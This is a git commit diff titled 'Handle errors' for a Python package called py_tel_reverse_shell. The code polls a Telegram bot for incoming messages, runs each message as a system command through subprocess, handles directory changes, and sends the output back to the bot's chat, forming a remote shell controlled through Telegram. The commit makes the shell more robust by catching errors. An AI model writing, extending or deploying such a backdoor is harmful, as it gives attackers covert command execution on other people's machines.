ce2384b896cc68dfec7a95fcc48f246b97fdeffd
TorhamDEV <torhamdev@gmail.com>
2021-09-19 12:18:46 +0430

    Handle errors

--- py_tel_reverse_shell/tel_shell.py
+++ py_tel_reverse_shell/tel_shell.py
@@ -3,7 +3,7 @@ from .tools import get_last_message
 
 import os
 from time import sleep
-from subprocess import check_output
+from subprocess import getoutput
 def start_shell(bot_token,chat_id):
     
     # get last message in bot
@@ -27,7 +27,9 @@ def start_shell(bot_token,chat_id):
         
         ## check repeat message
         if new_message_id == last_message_id:
+
             if repeat == 0:
+
                 engine.sender_message(
                 text=f"{os.getcwd()} $",
                 bot_token=bot_token,
@@ -40,18 +42,41 @@ def start_shell(bot_token,chat_id):
         ## check message. if message in new message
         elif new_message_id >= last_message_id:
             if new_message_text.split(" ")[0] == 'cd':
-                
-                os.chdir(new_message_text.split(" ")[1])
+                ## if cd command not True
+                try:
+                    os.chdir(new_message_text.split(" ")[1])
+            
+                except Exception as ex:
+
+                    engine.sender_message(
+                    text=f"You Get Error : \n {ex}",
+                    bot_token=bot_token,
+                    chat_id=chat_id
+                    )
+                    
                 
                 engine.sender_message(
                     text=f"{os.getcwd()} $",
                     bot_token=bot_token,
                     chat_id=chat_id
-                )
+                    ) 
             ## if command not a cd
             else:
-                result = check_output(new_message_text).decode()
-                engine.sender_message(text=result,bot_token=bot_token,chat_id=chat_id)
+                try:
+                    ## run command in system and send result 
+                    result = getoutput(new_message_text)
+                    engine.sender_message(text=result,bot_token=bot_token,chat_id=chat_id)
+                    engine.sender_message(text=f"{os.getcwd()} $",bot_token=bot_token,chat_id=chat_id)
+                    
+            
+                except Exception as ex:
+                    ## send error in run command on system
+                    engine.sender_message(
+                        text=f"You Get Error: \n {ex}",
+                        bot_token=bot_token,
+                        chat_id=chat_id
+                        )
+                    engine.sender_message(text=f"{os.getcwd()} $",bot_token=bot_token,chat_id=chat_id)
             
             
             last_message_id = new_message_id
--- py_tel_reverse_shell/tools.py
+++ py_tel_reverse_shell/tools.py
@@ -3,9 +3,13 @@ from .Engine import engine
 def get_last_message(bot_token):
     response = engine.receive_message(bot_token)
     
-    message_id = response[-1]['message']['message_id']
-    message_text = response[-1]['message']['text']
+    if response != False:
+        message_id = response[-1]['message']['message_id']
+        message_text = response[-1]['message']['text']
+        
+        result = {"text":message_text,"id":message_id}
+        
+        return result
     
-    result = {"text":message_text,"id":message_id}
-    
-    return result
+    else:
+        return False
